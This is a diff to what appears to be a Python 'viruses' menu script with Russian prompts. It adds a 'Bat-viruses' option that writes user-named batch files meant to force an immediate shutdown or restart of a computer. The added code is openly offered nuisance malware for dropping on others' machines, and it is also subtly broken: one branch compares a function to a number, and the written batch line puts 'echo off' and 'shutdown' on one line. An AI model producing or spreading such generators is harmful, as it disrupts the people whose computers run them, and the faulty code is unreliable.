@@ -957,7 +957,7 @@ def viruses():
                                                                  '''
 	print(banner)
 	text = '''
-	  \033[36m[1]-
+	  \033[36m[1]-Bat-viruses
 	  \033[36m[2]-
 	  \033[36m[3]-
 
@@ -971,10 +971,35 @@ def viruses():
 	def virus0():
 		print("\033[32mПрощайте!(Goodbye!)")
 		raise SystemExit
+	def virus1():
+		print('Какой батник создать?')
+		text = '''
+			[1]-Выключается компьютер
+			[2]-Перезагрузка компьютера
+
+		'''
+		print(text)
+		bat = int(input('bat-virus~#:'))
+		def bat1():
+			n = str(input('Имя вашего батника .bat:'))
+			k = open(n,"w",encoding='utf-8')
+			k.write("""@echo off shutdown -s -t 1 -c "lol" >nul""")
+			k.close()
+		def bat2():
+			n = str(input('Имя вашего батника .bat:'))
+			k = open(n,"w",encoding='utf-8')
+			k.write("""@echo off shutdown -r -t 1 -c "lol" >nul""")
+			k.close()
+		if bat ==1:
+			bat1()
+		elif bat2==2:
+			bat2()
 	if vir ==0:
 		virus0()
 	elif vir ==99:
 		virus99()
+	elif vir ==1:
+		virus1()
 	else:
 		print('\033[31mОшибка:не найдено(Error:not found)')
 		time.sleep(2)
